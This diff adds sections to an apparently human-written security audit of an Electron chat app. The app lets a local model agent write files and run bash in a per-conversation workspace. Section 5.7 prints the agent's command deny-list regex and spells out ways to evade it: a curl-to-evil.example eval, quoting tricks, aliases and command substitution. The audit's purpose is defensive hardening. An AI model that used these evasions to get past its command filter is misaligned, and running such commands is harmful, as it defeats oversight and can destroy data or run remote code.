@@ -1562,4 +1562,323 @@ Section 4 complete. Section 5 (`src/main/workspace.ts`) is next.
 
 ---
 
-## (Sections 5–7 and 9–10 will be filled in as the file-by-file deep dive continues.)
+# Section 5 — Main Process: `src/main/workspace.ts`
+
+**Path:** `src/main/workspace.ts` (398 lines)
+
+**Role:** Owns the per-conversation working-directory layer and the local HTTP server that exposes those directories to the Canvas preview pane. Provides the path-bounded primitives (`wsWriteFile`, `wsReadFile`, `wsEditFile`, `wsDeleteFile`, `wsRunBash`) that `tools.ts` (§4) wraps as agent-callable tools. Every filesystem operation the agent can perform passes through this file.
+
+**The single most important function in the codebase from a security standpoint is `assertInWorkspace`.** It is the only thing keeping the agent's filesystem reach bounded to its workspace.
+
+## 5.1 Module-level state & path helpers
+
+### State (lines 8–9)
+
+```ts
+let server: Server | null = null
+let serverPort = 0
+```
+
+Singletons for the workspace HTTP server. One server per app run, serves all conversations.
+
+### Paths (lines 11–21)
+
+- **`workspacesRoot()`** → `<userData>/workspaces/`. On macOS: `~/Library/Application Support/Gemma Chat/workspaces/`.
+- **`workspaceDir(conversationId)`** → `<userData>/workspaces/<sanitized-id>/`.
+- **`sanitizeId`** replaces every char that isn't `[a-zA-Z0-9_-]` with `_`, caps at 80 chars, defaults to `'default'` if the result is empty. Prevents conversation IDs from punching out of the workspaces root through filename-level injection.
+
+### `ensureWorkspace(conversationId)` (lines 23–27)
+
+`mkdir -p` the workspace dir. Idempotent. Returns the absolute path. Called by every tool that reads or writes.
+
+## 5.2 `assertInWorkspace(base, target)` — the security boundary (lines 29–36)
+
+```ts
+export function assertInWorkspace(base: string, target: string): string {
+  const resolved = resolve(base, target)
+  const rel = relative(base, resolved)
+  if (rel.startsWith('..') || rel.startsWith('/') || rel.includes('..' + sep)) {
+    throw new Error(`Path escapes workspace: ${target}`)
+  }
+  return resolved
+}
+```
+
+The classic Node.js path-traversal defense. Three checks on the resolved path's relative form:
+1. Starts with `..` (climbs above base).
+2. Starts with `/` (absolute path on POSIX — `resolve` keeps absolutes absolute).
+3. Contains `../` somewhere (smuggled traversal).
+
+If any check fails, throws. Otherwise returns the resolved absolute path.
+
+**This is the load-bearing security primitive.** Every workspace-mutating function (`wsWriteFile`, `wsReadFile`, `wsEditFile`, `wsDeleteFile`) calls `assertInWorkspace(base, path)` before doing anything. If this check has a bypass, the agent can read/write/delete anywhere on disk that the Electron process has permission for. As of this audit, the check is correctly implemented — but it's worth keeping in mind as **the** function to never break.
+
+**Notable gap:** `wsRunBash` does *not* go through `assertInWorkspace` for its commands — it can't, since commands are arbitrary shell. It only constrains the *cwd*. See §5.7.
+
+## 5.3 The workspace HTTP server (lines 38–168)
+
+### MIME map (lines 38–62)
+
+Comprehensive: HTML, CSS, JS/TS/JSX/TSX (all served as `text/javascript`), JSON, SVG/PNG/JPG/GIF/WebP/ICO, plain text, markdown, PDF, WASM, fonts (WOFF/WOFF2). Default: `application/octet-stream`. Note that `.ts` and `.tsx` are served as JavaScript MIME — useful for previewing TypeScript files in the browser at the cost of no actual type-checking happening server-side (the browser will likely error on TS syntax).
+
+### `startWorkspaceServer()` (lines 64–160)
+
+Called once from `app.whenReady` in `index.ts:476`. If already started, returns the existing port.
+
+1. **`mkdir(workspacesRoot(), { recursive: true })`** — ensure parent dir exists.
+2. **Create HTTP server** with a single request handler (see below).
+3. **Listen on port 0** (`server!.listen(0, '127.0.0.1', ...)`) — port 0 means "let the OS pick a free port." Bound to localhost only.
+4. **Capture the assigned port** from `server.address().port` and store as `serverPort`.
+
+The renderer queries this port via the `workspace:server-port` IPC handler (§2.7).
+
+### The request handler (lines 68–149)
+
+For each incoming request:
+
+1. **CORS headers** (lines 70–73): `Access-Control-Allow-Origin: ${origin ?? '*'}`, methods `GET, OPTIONS`, header `content-type`. **Wide-open CORS** — any origin can XHR these files. **Mitigating factor:** server bound to 127.0.0.1, so reachable only from processes on the same machine (and on a random port). Still: a browser pointed at `http://127.0.0.1:<port>/<conversationId>/` from outside Electron could read any workspace file. Captured for §Hardening — restrict origin to the renderer's origin only (Electron's `file://` for production builds, the Vite dev URL for dev).
+2. **Cache-control: no-store** — Canvas previews must always reflect the latest file state.
+3. **OPTIONS preflight** → 204 (lines 77–81).
+4. **Path parsing** (lines 83–92):
+   - URL → `URL` object → split on `/`, filter empties.
+   - First segment = conversation ID.
+   - Remaining segments = relative path within that conversation's workspace.
+   - Empty path → return literal `"gemma-chat workspace server"` text.
+5. **Path-traversal guard** (lines 94–100) — calls `assertInWorkspace`. On failure: 400 Bad Path. **Good — defense in depth.** Even though the conversation ID is sanitized, the rest of the path could contain `..` segments; `assertInWorkspace` catches it.
+6. **Stat the target** (lines 102–115):
+   - On failure (file doesn't exist): if path is the workspace root, render the **placeholder HTML** ("No preview yet — Ask Gemma to create index.html"). Otherwise: 404 Not found.
+7. **If it's a directory** (lines 117–136):
+   - Look for `index.html`. If present, serve it (with HTML MIME).
+   - Otherwise render a directory listing (HTML, links to entries).
+8. **If it's a file** (lines 138–144):
+   - Pick MIME by extension (default octet-stream).
+   - `createReadStream(target).pipe(res)` — streamed response with content-length header.
+9. **Any thrown exception** → 500 with the message.
+
+### `stopWorkspaceServer()` (lines 162–168)
+
+`server.close()`, null the references. Called from `index.ts:before-quit`. **Synchronous from the caller's POV** — `server.close()` is non-blocking; in-flight requests may continue briefly. Reasonable for shutdown.
+
+### `previewUrl(conversationId)` (lines 174–176)
+
+```ts
+return `http://127.0.0.1:${serverPort}/${sanitizeId(conversationId)}/`
+```
+
+Used by `index.ts:handleChat` (code mode) to tell the system prompt the preview URL, and by `Canvas.tsx` (verify §8) to point its iframe.
+
+### Placeholder + directory-list renderers (lines 178–226)
+
+Dark-themed HTML, inline styles. The placeholder shows a folder icon and "Ask Gemma to create `index.html`". The directory list is a simple `<ul>` of links. `escapeHtml` (lines 220–226) handles the obvious entity-escape on filenames.
+
+## 5.4 `listTree(base, max=200)` (lines 234–268)
+
+Recursive walk of a directory tree, returning `FileEntry[]` (`{ path, kind, size? }`).
+
+- **Skips dotfiles** (`if (e.name.startsWith('.'))`) — `.git`, `.DS_Store`, etc.
+- **Skips `node_modules`** — explicit filter at line 250.
+- **Sorts: directories first**, then alphabetical.
+- **Hard cap at `max`** (default 200) — when reached, walking stops mid-directory. This is checked at the top of `walk` *and* inside the for-loop, so the cap is respected even if a single directory has > 200 entries.
+- **Gracefully handles unreadable directories** — `try { readdir }` returns silently.
+- For files, attempts to `stat` for the `size` field; on failure, omits size but still includes the entry.
+
+Used by:
+- `tools.ts:listFiles` (max 200).
+- `index.ts:workspace:list` IPC handler (max 300).
+
+Two distinct callers using different caps. Captured as low-priority §Hardening — consolidate to a single constant.
+
+## 5.5 `wsWriteFile` (lines 270–282)
+
+```ts
+const tmp = target + '.tmp-' + Date.now()
+await writeFile(tmp, content, 'utf-8')
+await rename(tmp, target)
+```
+
+**Atomic write via temp + rename.** This is exactly the right primitive for the live-streaming case where `wsWriteFile` may be called many times in rapid succession with growing content — a partial write to the real path would corrupt the file the Canvas iframe is rendering. Renames are atomic on POSIX within the same filesystem.
+
+Also mkdir's parent dirs (line 277), so `wsWriteFile(conv, 'src/components/Foo.tsx', ...)` creates `src/` and `src/components/` as needed.
+
+Returns the absolute target path. Caller doesn't actually use this return value (`tools.ts:writeFile` returns its own formatted message).
+
+## 5.6 `wsReadFile` and `wsEditFile`
+
+### `wsReadFile` (lines 284–288)
+
+Trivial: ensureWorkspace, assertInWorkspace, return `readFile(target, 'utf-8')`.
+
+### `wsEditFile` (lines 290–314) — the find-and-replace contract
+
+Two code paths:
+
+**`replaceAll === true`:**
+1. `content.split(oldString)`. If only one part → `oldString` wasn't found → throw `"old_string not found"`.
+2. Otherwise `parts.join(newString)`, write back. Returns `{ occurrences: parts.length - 1 }`.
+
+**`replaceAll === false` (default):**
+1. `indexOf(oldString)`. If not found → throw.
+2. **Look for a second occurrence** at `idx + oldString.length`. If found → throw `"old_string appears multiple times in <path>. Use replace_all or add context."`
+3. Splice-replace at the single occurrence. Returns `{ occurrences: 1 }`.
+
+**This mirrors the Claude Code Edit tool contract exactly** — uniqueness-or-throw is the discipline that prevents the model from accidentally editing the wrong instance of a generic substring. Worth preserving as-is.
+
+## 5.7 `wsDeleteFile` (lines 316–320) and `wsRunBash` (lines 322–397)
+
+### `wsDeleteFile`
+
+```ts
+await rm(target, { recursive: true, force: true })
+```
+
+Recursive + force. Bounded by `assertInWorkspace`, so it cannot delete anything outside the workspace. **One call deletes a whole subtree** — combined with `delete_file`'s no-confirmation tool behavior (§4.2.8), the agent can wipe the workspace in a single action. Bounded blast radius, but worth a §Hardening item to require a `confirm=true` arg for directory deletes.
+
+### `wsRunBash` — the trust boundary
+
+```ts
+const BASH_DENY =
+  /\b(rm\s+-rf\s+\/|sudo|:\(\)\s*\{|chmod\s+777\s+\/|mkfs|dd\s+if=|shutdown|reboot)/i
+```
+
+Six patterns the deny regex catches:
+- `rm -rf /` (literal root wipe)
+- `sudo` (any sudo invocation)
+- `:(){...}` (the classic fork bomb)
+- `chmod 777 /`
+- `mkfs` (filesystem creation)
+- `dd if=` (raw disk write)
+- `shutdown`, `reboot`
+
+If matched: throw `'Blocked by safety policy: command contains a denied pattern.'`
+
+**This is shallow defense.** Evasions are trivial:
+- `rm -rf $HOME` — not matched (`$HOME` is not literal `/`)
+- `bash -c "<destructive>"` — outer command doesn't contain the destructive token
+- `eval $(curl evil.example/script)` — no denied tokens in the visible command
+- `r''m -rf /` — shell quoting evades the regex
+- A wrapper invocation that shells out from Python or Ruby — no denied tokens at all
+- `alias safedelete='rm -rf'; safedelete /` — alias indirection
+- `$(echo rm) -rf /` — command substitution
+
+The deny regex catches **only** copy-pasted obviously-destructive commands. It does not constitute a sandbox. A motivated adversarial input (whether from a user, a tool result, or a misbehaving model) routes around it without effort.
+
+**Spawn details:**
+- `/bin/bash -lc <command>` — login shell. Sources `.bash_profile` / `.bashrc`. Inherits the user's full shell environment including aliases and PATH.
+- `cwd: base` — set to the workspace dir. But the command can `cd` elsewhere.
+- `env: { ...process.env, FORCE_COLOR: '0', NO_COLOR: '1' }` — disables color codes (cleaner output for the model to parse).
+- **Output cap: 16,000 bytes** per stream. Beyond that: truncated, `\n[…output truncated]` appended.
+- **Timeout: 60_000 ms default.** SIGKILL on expiry.
+- Returns `{ exitCode, stdout, stderr, truncated, durationMs }`.
+
+**The implication for your stated goals:** the existing pattern is "the model is trusted within the workspace, and there's a thin speed bump against the most embarrassing destructive commands." For a single-user dev tool driven by a local model with a single human user, this is defensible. For:
+- A Skills feature where Skills can themselves spawn shells
+- Approved-basis filesystem access that widens the workspace to real user dirs
+- Any sharing of conversations or templates between users
+
+…the threat model changes significantly. The path forward (captured for §Hardening) is: deny-by-default with user approval gating for `run_bash`, plus a real sandbox (e.g., `sandbox-exec` on macOS, which is built-in) for the actual execution. We don't have to design that today — but we should know what we're inheriting.
+
+## §5 Synthesis
+
+1. **The path-bounded primitives are well-designed.** `assertInWorkspace` + atomic temp/rename writes + uniqueness-enforced edits are all the right shapes. Preserve.
+2. **The HTTP server is small, focused, and correctly bound to localhost.** Wide-open CORS is a misalignment (captured) but the blast radius is bounded by 127.0.0.1.
+3. **`wsRunBash` is the real risk.** Deny regex is a speed bump, not a sandbox. This is the central security item for the Skills + approved-FS work.
+4. **No file watcher.** Filesystem mutations are signaled only when our own code calls `ctx.onFileChange?.()`. If something *outside* the app modifies the workspace (e.g., the user opens it in Finder and edits), the renderer never knows. Captured for §Hardening — a chokidar-style watcher would close that loop.
+5. **The HTTP server's directory listing renders user-controlled filenames** with `escapeHtml`. Correctly escaped. No XSS risk via filenames in the listing UI.
+6. **HF cache (`<userData>/mlx/models`) and workspaces (`<userData>/workspaces`) are siblings** under userData. Each is independently deletable for "fresh start" purposes — clean separation.
+
+---
+
+# Section 6 — Preload Bridge: `src/preload/`
+
+**Files:** `src/preload/index.ts` (90 lines), `src/preload/index.d.ts` (7 lines).
+
+**Role:** The TypeScript-typed `contextBridge` exposing the main-process IPC surface to the renderer as `window.api`. This is the *complete* set of operations the renderer can perform; if a function isn't here, the renderer cannot reach it. After §1.6 (shared types) and §2.7 (IPC handler registry), this file completes the IPC contract triangle.
+
+## 6.1 `src/preload/index.ts`
+
+### Imports
+
+Type-only imports from `../shared/types`. **Uses relative path** rather than the `@shared` alias — same minor inconsistency flagged in §2.1.
+
+### The `api` object — 15 methods
+
+#### Setup & MLX
+
+| Method | Wraps | Direction |
+|---|---|---|
+| `startSetup(model)` | `ipcRenderer.invoke('setup:start', model)` | renderer → main, void |
+| `switchModel(model)` | `invoke('model:switch', model)` | renderer → main, void |
+| `checkMLX()` | `invoke('setup:status')` | renderer → main, returns `{ hasMLX: boolean }` |
+| `onSetupStatus(cb)` | `on('setup:status', ...)` | main → renderer, returns unsubscribe fn |
+
+`onSetupStatus` returns a **cleanup function**. Standard React-friendly pattern: `useEffect(() => api.onSetupStatus(setStatus), [])` works correctly.
+
+#### Models & chat
+
+| Method | Wraps | Direction |
+|---|---|---|
+| `listLocalModels()` | `invoke('models:list-local')` | returns `string[]` |
+| `sendChat(req, onChunk)` | composite (see below) | streaming |
+| `abortChat(conversationId)` | `invoke('chat:abort', conversationId)` | void |
+| `listTools()` | `invoke('tools:list')` | tool metadata |
+| `transcribeAudio(base64, model)` | `invoke('audio:transcribe', { base64, model })` | returns `{ text: string }` (always empty — see §2.7) |
+
+`sendChat` is the most interesting method in this file (lines 25–37). Three steps:
+1. Invoke `chat:send`, await the returned channel name (`chat:stream:${conversationId}`).
+2. Set up a listener on that dynamic channel.
+3. For each chunk, call the consumer's `onChunk`. On terminal (`done` or `error`), remove the listener and resolve the outer promise.
+
+**Single Promise wraps the entire stream.** The renderer's `Chat.tsx` can `await api.sendChat(req, handleChunk)` and the await resolves only when the stream terminates. Clean abstraction.
+
+**Two implications for the lying-spinner cousin failure on chat:**
+- If the stream never emits `done` or `error`, the listener is never removed and the promise never resolves. There is **no client-side timeout**. A hung main-side `handleChat` (e.g., if `mlx_vlm.server` stops responding mid-stream) leaves this promise hanging forever from the renderer's view too. Captured for §Hardening.
+- The `await` could be a useful place to enforce a renderer-side dead-man timer (`Promise.race([sendChatPromise, timeoutPromise])`) without changing the main process at all.
+
+#### Workspace
+
+| Method | Wraps |
+|---|---|
+| `getWorkspace(conv)` | `invoke('workspace:info', conv)` → `WorkspaceInfo` |
+| `listWorkspace(conv)` | `invoke('workspace:list', conv)` → `WorkspaceFile[]` |
+| `openWorkspace(conv)` | `invoke('workspace:open-external', conv)` → void |
+| `workspaceServerPort()` | `invoke('workspace:server-port')` → `number` |
+| `onWorkspaceChanged(cb)` | `on('workspace:changed', ...)` → unsubscribe |
+
+#### Debug / streaming
+
+| Method | Channel |
+|---|---|
+| `onRawChunk(cb)` | `chat:raw` (devtools-only raw token stream) |
+| `onFileStreaming(cb)` | `file:streaming` (live write_file content for Canvas) |
+
+### `contextBridge.exposeInMainWorld('api', api)` (line 88)
+
+Exposes the entire `api` object on `window.api` in the renderer's main world (not isolated world). **Because `contextIsolation: true`** is set in `index.ts:69`, this is the *only* way data crosses from preload into renderer — direct global access is blocked.
+
+### `export type Api = typeof api` (line 90)
+
+Exported so `index.d.ts` can read the shape.
+
+## 6.2 `src/preload/index.d.ts`
+
+Augments the global `Window` interface so renderer TypeScript code sees `window.api` typed correctly. This is what lets the renderer get autocomplete and type-check against the bridge without re-declaring shapes.
+
+## §6 Synthesis
+
+1. **The IPC contract is closed and complete.** Every channel registered in `index.ts` (§2.7) is exposed in preload; the inverse is also true (no orphan handles in main, no fictitious methods in preload). This is the kind of consistency that's easy to lose during fast iteration — worth preserving as we add Skills/filesystem features.
+2. **`sendChat`'s no-timeout design is the cousin failure to the lying spinner.** A hung main-side chat leaves the renderer's `await` hanging too. Adding a renderer-side `Promise.race` with a generous-but-bounded timeout is a small-effort, high-impact fix.
+3. **The bridge is the right place to add per-tool approval UX.** A new method like `approveAction(callId, decision)` would let `tools.ts:runTool` block on user input — the IPC plumbing already supports invoke/return semantics for this.
+4. **`Api = typeof api` is a clean self-typing pattern.** No duplication between the implementation and the type declaration. We should preserve this when adding methods — add the new method to `api`, the type auto-updates, the renderer's TS sees it immediately.
+5. **For Skills + filesystem-access additions, the natural new methods are:**
+   - `listSkills(): Promise<SkillManifest[]>` / `installSkill(...)` / `uninstallSkill(...)`
+   - `requestFilesystemAccess(path: string): Promise<{ granted: boolean }>` (the approved-basis gate)
+   - `listApprovedPaths(): Promise<string[]>`
+   - `revokeApprovedPath(path: string): Promise<void>`
+
+   Each one new method here + new handler in §2.7 + new `ToolSpec` entries in §4 = a complete vertical slice.
+
+Section 6 complete. Section 7 (renderer entry + Setup/Chat/App — the deep dive on the lying-spinner UI) is next.
+
+---
+
+## (Sections 7 and 9–10 will be filled in as the file-by-file deep dive continues.)
